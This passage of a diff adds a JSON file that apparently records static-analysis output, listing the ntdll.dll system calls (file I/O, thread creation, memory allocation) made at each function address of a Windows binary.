+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 104,
+     "text": "0x68"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368946055,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 104,
+     "text": "0x68"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368946439,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368946519,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationFile",
+   "api": "NtQueryInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 8,
+     "text": "8"
+    }
+   ]
+  }
+ ],
+ "0x14003a080": [],
+ "0x14003a090": [],
+ "0x14003a0c0": [],
+ "0x14003a0f0": [],
+ "0x14003a120": [],
+ "0x14003a130": [],
+ "0x14003a140": [
+  {
+   "call_addr": 5368947517,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1048704,
+     "text": "0x100080"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368948364,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368948404,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368948624,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368948661,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368948722,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368948836,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003a870": [
+  {
+   "call_addr": 5368950285,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368950383,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003aec0": [
+  {
+   "call_addr": 5368950643,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x20)"
+    }
+   ]
+  }
+ ],
+ "0x14003aff0": [],
+ "0x14003b030": [],
+ "0x14003b080": [
+  {
+   "call_addr": 5368951684,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368952190,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952276,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368952592,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952730,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952834,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952852,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952870,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952888,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952906,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952924,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952942,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368952973,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003b8a0": [
+  {
+   "call_addr": 5368953688,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x40070)"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1114112,
+     "text": "0x110000"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x40008)"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x40058)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368953931,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368953982,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368954023,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368954275,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x40058)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x4007f)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368954374,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368954422,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationFile",
+   "api": "NtSetInformationFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368954453,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003bec0": [],
+ "0x14003bee0": [
+  {
+   "call_addr": 5368955156,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003c160": [],
+ "0x14003c2b0": [
+  {
+   "call_addr": 5368955864,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryDirectoryFile",
+   "api": "NtQueryDirectoryFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368955976,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryDirectoryFile",
+   "api": "NtQueryDirectoryFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x14003c6f0": [
+  {
+   "call_addr": 5368956692,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003c730": [],
+ "0x14003c850": [],
+ "0x14003c9c0": [],
+ "0x14003cd70": [
+  {
+   "call_addr": 5368959040,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368960148,
+   "dll": "ntdll.dll",
+   "api_raw": "NtLockFile",
+   "api": "NtLockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368960192,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368960279,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368960316,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368960381,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003d590": [],
+ "0x14003d880": [
+  {
+   "call_addr": 5368961665,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryAttributesFile",
+   "api": "NtQueryAttributesFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368961750,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryAttributesFile",
+   "api": "NtQueryAttributesFile",
+   "args": []
+  }
+ ],
+ "0x14003dbe0": [
+  {
+   "call_addr": 5368962136,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003dcb0": [],
+ "0x14003dd20": [
+  {
+   "call_addr": 5368963244,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x40070)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x40010)"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x40000)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368963627,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368963885,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003e540": [
+  {
+   "call_addr": 5368964511,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003e5d0": [],
+ "0x14003e7c0": [
+  {
+   "call_addr": 5368965558,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 2148532224,
+     "text": "0x80100000"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368966173,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14003eca0": [
+  {
+   "call_addr": 5368966337,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "pointer",
+     "value": 5369400992,
+     "text": "0x1400a8ea0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368966396,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCancelIoFileEx",
+   "api": "NtCancelIoFileEx",
+   "args": []
+  },
+  {
+   "call_addr": 5368966437,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  }
+ ],
+ "0x14003ed40": [
+  {
+   "call_addr": 5368966965,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368967015,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368967173,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368967223,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368967365,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368967412,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  }
+ ],
+ "0x14003f130": [],
+ "0x14003f173": [],
+ "0x14003f252": [
+  {
+   "call_addr": 5368969110,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5368970000,
+     "text": "0x14003fb10"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368969295,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x14003f291": [],
+ "0x14003f2de": [],
+ "0x14003f368": [],
+ "0x14003f3b5": [
+  {
+   "call_addr": 5368969449,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5368970000,
+     "text": "0x14003fb10"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368969632,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWriteFile",
+   "api": "NtWriteFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x14003f401": [],
+ "0x14003f44e": [],
+ "0x14003fb10": [],
+ "0x14003fe90": [
+  {
+   "call_addr": 5368971051,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  }
+ ],
+ "0x14003ff50": [
+  {
+   "call_addr": 5368971609,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5368928288,
+     "text": "0x140035820"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0xaf)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368971745,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368971834,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368971893,
+   "dll": "ntdll.dll",
+   "api_raw": "NtReadFile",
+   "api": "NtReadFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368972052,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368972152,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  },
+  {
+   "call_addr": 5368972343,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCancelIoFileEx",
+   "api": "NtCancelIoFileEx",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x98)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x38)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368972373,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDelayExecution",
+   "api": "NtDelayExecution",
+   "args": []
+  }
+ ],
+ "0x1400404b0": [],
+ "0x1400404c0": [],
+ "0x1400404e0": [],
+ "0x1400405b0": [],
+ "0x140040600": [],
+ "0x140040640": [],
+ "0x140040670": [],
+ "0x1400406e0": [],
+ "0x1400407c0": [
+  {
+   "call_addr": 5368973442,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAlertThread",
+   "api": "NtAlertThread",
+   "args": []
+  },
+  {
+   "call_addr": 5368973508,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCancelSynchronousIoFile",
+   "api": "NtCancelSynchronousIoFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140040940": [
+  {
+   "call_addr": 5368973902,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAlertThreadByThreadId",
+   "api": "NtAlertThreadByThreadId",
+   "args": []
+  }
+ ],
+ "0x140040ab0": [
+  {
+   "call_addr": 5368974429,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368974455,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlFreeHeap",
+   "api": "RtlFreeHeap",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140040de0": [
+  {
+   "call_addr": 5368975361,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368975387,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlFreeHeap",
+   "api": "RtlFreeHeap",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x1400411d0": [
+  {
+   "call_addr": 5368975898,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlAllocateHeap",
+   "api": "RtlAllocateHeap",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 48,
+     "text": "0x30"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368975976,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetActiveActivationContext",
+   "api": "RtlGetActiveActivationContext",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x20)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368976137,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateThreadEx",
+   "api": "NtCreateThreadEx",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x10)"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 33554432,
+     "text": "0x2000000"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5369402096,
+     "text": "0x1400a92f0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368976172,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlActivateActivationContextEx",
+   "api": "RtlActivateActivationContextEx",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x1c)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368976187,
+   "dll": "ntdll.dll",
+   "api_raw": "NtResumeThread",
+   "api": "NtResumeThread",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368976208,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlReleaseActivationContext",
+   "api": "RtlReleaseActivationContext",
+   "args": []
+  },
+  {
+   "call_addr": 5368976221,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlFreeHeap",
+   "api": "RtlFreeHeap",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368976273,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlReleaseActivationContext",
+   "api": "RtlReleaseActivationContext",
+   "args": []
+  }
+ ],
+ "0x1400413b0": [
+  {
+   "call_addr": 5368976449,
+   "dll": "ntdll.dll",
+   "api_raw": "NtOpenThread",
+   "api": "NtOpenThread",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 5,
+     "text": "5"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5369402144,
+     "text": "0x1400a9320"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368976733,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368976757,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlFreeHeap",
+   "api": "RtlFreeHeap",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140041650": [],
+ "0x140041710": [
+  {
+   "call_addr": 5368977299,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCancelSynchronousIoFile",
+   "api": "NtCancelSynchronousIoFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x18)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368977320,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAlertThread",
+   "api": "NtAlertThread",
+   "args": []
+  }
+ ],
+ "0x140041830": [],
+ "0x140041910": [],
+ "0x140041a70": [
+  {
+   "call_addr": 5368978571,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368978600,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlFreeHeap",
+   "api": "RtlFreeHeap",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140041e20": [
+  {
+   "call_addr": 5368979581,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368979610,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlFreeHeap",
+   "api": "RtlFreeHeap",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140042230": [],
+ "0x140042270": [],
+ "0x140042320": [],
+ "0x140042330": [],
+ "0x140042350": [],
+ "0x140042380": [],
+ "0x1400423b0": [],
+ "0x1400423e0": [],
+ "0x140042400": [],
+ "0x140044ad0": [],
+ "0x140044ae0": [],
+ "0x140044d30": [],
+ "0x140044d50": [],
+ "0x140044ed0": [],
+ "0x140044ee0": [],
+ "0x140044f10": [],
+ "0x140044f20": [],
+ "0x1400450b0": [],
+ "0x1400451f0": [],
+ "0x1400457a0": [],
+ "0x140046070": [],
+ "0x1400463d0": [],
+ "0x140046490": [],
+ "0x1400464a0": [],
+ "0x140046710": [],
+ "0x140046720": [],
+ "0x140046b70": [],
+ "0x140046d00": [],
+ "0x1400472b0": [],
+ "0x140047520": [],
+ "0x1400475d0": [],
+ "0x1400475e0": [],
+ "0x140047af0": [],
+ "0x140048000": [],
+ "0x140048510": [],
+ "0x1400488e0": [],
+ "0x140048ce0": [],
+ "0x140048e60": [],
+ "0x140048ec0": [],
+ "0x140048ed0": [],
+ "0x140049240": [],
+ "0x140049260": [],
+ "0x1400493e0": [],
+ "0x140049420": [],
+ "0x140049430": [],
+ "0x140049810": [],
+ "0x140049870": [],
+ "0x140049be0": [],
+ "0x140049bf0": [],
+ "0x140049c50": [],
+ "0x140049c60": [],
+ "0x14004a010": [],
+ "0x14004a350": [],
+ "0x14004a360": [],
+ "0x14004a440": [],
+ "0x14004a450": [],
+ "0x14004a6e0": [],
+ "0x14004a7b0": [],
+ "0x14004a930": [],
+ "0x14004aca0": [],
+ "0x14004acb0": [],
+ "0x14004ad80": [],
+ "0x14004ad90": [],
+ "0x14004b610": [],
+ "0x14004c0e0": [],
+ "0x14004c180": [],
+ "0x14004c190": [],
+ "0x14004c6d0": [],
+ "0x14004c770": [],
+ "0x14004ccb0": [],
+ "0x14004ccc0": [
+  {
+   "call_addr": 5369023771,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAllocateVirtualMemory",
+   "api": "NtAllocateVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369023822,
+   "dll": "ntdll.dll",
+   "api_raw": "NtFreeVirtualMemory",
+   "api": "NtFreeVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x18)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 32768,
+     "text": "0x8000"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369023886,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAllocateVirtualMemory",
+   "api": "NtAllocateVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5369023978,
+   "dll": "ntdll.dll",
+   "api_raw": "NtFreeVirtualMemory",
+   "api": "NtFreeVirtualMemory",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x20)"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x28)"
